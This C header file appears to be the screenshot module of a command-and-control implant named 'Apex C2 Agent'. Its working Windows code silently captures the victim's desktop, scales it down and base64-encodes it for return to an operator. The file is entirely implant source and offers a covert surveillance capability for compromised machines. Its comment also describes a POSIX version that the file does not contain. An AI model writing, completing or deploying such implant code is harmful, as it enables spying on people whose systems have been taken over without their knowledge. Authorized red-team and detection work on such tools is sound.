#ifndef APEX_SCREENSHOT_H
#define APEX_SCREENSHOT_H

/*
 * Screenshot capture for Apex C2 Agent.
 * Windows: GDI BitBlt to BMP in-memory.
 * POSIX:   Shells out to available screenshot tools.
 *
 * The output is base64-encoded BMP data written to the caller-provided buffer.
 * Caller must provide a buffer >= 2MB for reasonable screenshots.
 */

#ifdef _WIN32

#include <windows.h>
#include <wingdi.h>

#pragma pack(push, 1)
typedef struct {
    WORD  bfType;
    DWORD bfSize;
    WORD  bfReserved1;
    WORD  bfReserved2;
    DWORD bfOffBits;
} BMP_FILE_HEADER;
#pragma pack(pop)

static void handle_screenshot(char *out_b64, size_t out_cap) {
    HDC hdcScreen = GetDC(NULL);
    if (!hdcScreen) {
        b64_encode((unsigned char*)"Failed to get screen DC", 23, out_b64);
        return;
    }

    int fullW = GetSystemMetrics(SM_CXSCREEN);
    int fullH = GetSystemMetrics(SM_CYSCREEN);

    /* Scale down: max 640px wide to keep output under ~1.5MB */
    int scale = 1;
    while ((fullW / scale) > 640) scale++;
    int w = fullW / scale;
    int h = fullH / scale;

    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBmp = CreateCompatibleBitmap(hdcScreen, w, h);
    HGDIOBJ hOld = SelectObject(hdcMem, hBmp);

    SetStretchBltMode(hdcMem, HALFTONE);
    StretchBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, fullW, fullH, SRCCOPY);

    /* Build BMP in memory */
    int rowSize = ((w * 3 + 3) & ~3);
    int pixelDataSize = rowSize * h;
    int fileSize = (int)(sizeof(BMP_FILE_HEADER) + sizeof(BITMAPINFOHEADER) + pixelDataSize);

    unsigned char *bmpBuf = (unsigned char *)malloc((size_t)fileSize);
    if (!bmpBuf) {
        SelectObject(hdcMem, hOld);
        DeleteObject(hBmp);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        b64_encode((unsigned char*)"Out of memory", 13, out_b64);
        return;
    }

    BMP_FILE_HEADER *fh = (BMP_FILE_HEADER *)bmpBuf;
    fh->bfType = 0x4D42; /* 'BM' */
    fh->bfSize = (DWORD)fileSize;
    fh->bfReserved1 = 0;
    fh->bfReserved2 = 0;
    fh->bfOffBits = (DWORD)(sizeof(BMP_FILE_HEADER) + sizeof(BITMAPINFOHEADER));

    BITMAPINFOHEADER *bi = (BITMAPINFOHEADER *)(bmpBuf + sizeof(BMP_FILE_HEADER));
    memset(bi, 0, sizeof(*bi));
    bi->biSize = sizeof(BITMAPINFOHEADER);
    bi->biWidth = w;
    bi->biHeight = h; /* bottom-up for BMP compat */
    bi->biPlanes = 1;
    bi->biBitCount = 24;
    bi->biCompression = BI_RGB;
    bi->biSizeImage = (DWORD)pixelDataSize;

    unsigned char *pixels = bmpBuf + sizeof(BMP_FILE_HEADER) + sizeof(BITMAPINFOHEADER);

    BITMAPINFO bmi;
    memset(&bmi, 0, sizeof(bmi));
    bmi.bmiHeader = *bi;
    GetDIBits(hdcMem, hBmp, 0, (UINT)h, pixels, &bmi, DIB_RGB_COLORS);

    SelectObject(hdcMem, hOld);
    DeleteObject(hBmp);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    /* Base64 encode — ensure output buffer is large enough */
    size_t b64_needed = ((size_t)fileSize + 2) / 3 * 4 + 1;
    if (b64_needed < out_cap) {
        b64_encode(bmpBuf, (size_t)fileSize, out_b64);
    } else {
        b64_encode((unsigned char*)"Screenshot too large for buffer", 31, out_b64);
    }

    free(bmpBuf);
}

#endif /* _WIN32 */
#endif /* APEX_SCREENSHOT_H */
